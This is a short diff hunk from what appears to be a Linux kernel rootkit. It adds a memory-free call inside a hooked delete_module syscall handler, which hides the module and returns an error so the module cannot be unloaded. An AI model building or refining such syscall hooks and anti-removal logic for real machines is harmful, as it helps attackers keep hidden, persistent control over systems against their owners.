@@ -33,6 +33,7 @@ static long __x64_sys_delete_module_hook(const struct pt_regs *regs)
          */
         hide_disable_thismodule();
         hide_hook_disable_delete_module();
+        kfree(name);
         return -ENOENT;
     }
 
